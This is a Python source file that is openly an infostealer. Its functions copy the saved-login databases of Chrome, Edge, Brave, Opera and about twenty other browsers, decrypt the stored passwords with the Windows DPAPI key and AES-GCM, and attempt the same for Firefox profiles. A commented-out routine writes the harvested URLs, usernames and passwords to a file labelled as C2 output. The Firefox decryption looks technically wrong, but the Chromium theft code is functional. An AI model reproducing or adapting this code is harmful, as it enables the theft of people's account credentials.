import os
import json
import base64
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key(browser):
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", browser,
                                    "User Data", "Local State")
    try:
        with open(localState_path, "r", encoding="utf-8") as file:
            local_state_file = json.load(file)
        ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]  # decrypted key
    except Exception as e:
        print(f"Error obtaining encryption key for {browser}: {e}")
        return None

def decrypt_password(enc_password, key):
    try:
        init_vector = enc_password[3:15]
        enc_password = enc_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, init_vector)
        return cipher.decrypt(enc_password)[:-16].decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return "No Passwords(logged in with Social Account)"

def steal_chrome_based_creds(browser):
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            browser, "User Data", "Default", "Login Data")
    if not os.path.exists(password_db_path):
        print(f"File not found: {password_db_path}")
        return {}
    
    try:
        shutil.copyfile(password_db_path, "my_chrome_data.db")
        db = sqlite3.connect("my_chrome_data.db")
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        encp_key = encryption_key(browser)
        if not encp_key:
            return {}
        data = {}
        for row in cursor.fetchall():
            site_url = row[0]
            username = row[1]
            password = decrypt_password(row[2], encp_key)
            date_created = row[3]
            if username or password:
                data[site_url] = []
                data[site_url].append({
                    "username": username,
                    "password": password,
                    "date_created": str(my_chrome_datetime(date_created))
                })
        cursor.close()
        db.close()
        os.remove("my_chrome_data.db")
        return data
    except Exception as e:
        print(f"Error stealing credentials from {browser}: {e}")
        return {}

def steal_firefox_creds():
    firefox_profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    profiles = [f for f in os.listdir(firefox_profile_path) if f.endswith('.default-release')]
    if not profiles:
        print("No Firefox profiles found.")
        return {}
    
    profile_path = os.path.join(firefox_profile_path, profiles[0])
    logins_path = os.path.join(profile_path, "logins.json")
    key4_db_path = os.path.join(profile_path, "key4.db")
    
    if not os.path.exists(logins_path) or not os.path.exists(key4_db_path):
        print("Firefox login data or key database not found.")
        return {}
    
    try:
        with open(logins_path, "r", encoding="utf-8") as file:
            logins_data = json.load(file)
        
        conn = sqlite3.connect(key4_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password';")
        row = cursor.fetchone()
        global_salt = row[0]
        item2 = row[1]
        
        cursor.execute("SELECT a11, a102 FROM nssPrivate;")
        row = cursor.fetchone()
        entry_salt = row[0]
        cipher_text = row[1]
        
        
        master_password = win32crypt.CryptUnprotectData(global_salt + entry_salt + cipher_text, None, None, None, 0)[1]
        
        data = {}
        for login in logins_data["logins"]:
            enc_username = base64.b64decode(login["encryptedUsername"])
            enc_password = base64.b64decode(login["encryptedPassword"])
            
            username = win32crypt.CryptUnprotectData(enc_username, None, None, None, 0)[1]
            password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
            
            data[login["hostname"]] = {
                "username": username.decode(),
                "password": password.decode(),
                "date_created": login["timeCreated"]
            }
        
        cursor.close()
        conn.close()
        return data
    except Exception as e:
        print(f"Error stealing Firefox credentials: {e}")
        return {}

#def save_credentials_to_file(data, filename="credentials.txt"):
    #with open(filename, "w", encoding="utf-8") as file:
        #for browser, creds in data.items():
            #for site, details in creds.items():
                #for detail in details:
                    #if detail["password"] != "No Passwords(logged in with Social Account)":
                        #file.write("----------------- layn c2 ------------\n")
                        #file.write(f"url: {site}\n")
                        #file.write(f"user: {detail['username']}\n")
                        #file.write(f"pass: {detail['password']}\n")
                        #file.write("----------------- layn c2 ------------\n")

def stealcreds():
    data = {}
    browsers = [
        "Google\\Chrome",
        "BraveSoftware\\Brave-Browser",
        "Opera Software\\Opera Stable",
        "Opera Software\\Opera GX Stable",
        "Microsoft\\Edge",
        "Vivaldi",
        "Epic Privacy Browser",
        "Amigo",
        "Orbitum",
        "Mail.Ru\\Atom",
        "Kometa",
        "Comodo\\Dragon",
        "Torch",
        "Comodo",
        "Slimjet",
        "360Browser\\Browser",
        "Maxthon3",
        "K-Melon",
        "Sputnik\\Sputnik",
        "Nichrome",
        "CocCoc\\Browser",
        "uCozMedia\\Uran",
        "Chromodo",
        "Yandex\\YandexBrowser"
    ]
    
    for browser_path in browsers:
        try:
            browser_data = steal_chrome_based_creds(browser_path)
            if browser_data:
                data[browser_path] = browser_data
        except Exception as e:
            print(f"Error obtaining {browser_path} credentials: {e}")

    try:
        firefox_data = steal_firefox_creds()
        if firefox_data:
            data["firefox"] = firefox_data
    except Exception as e:
        print(f"Error obtaining Firefox credentials: {e}")

    #if data:
        #print("Credentials obtained successfully.")
        #save_credentials_to_file(data)
    #else:
        #print("No credentials found.")
    
    return data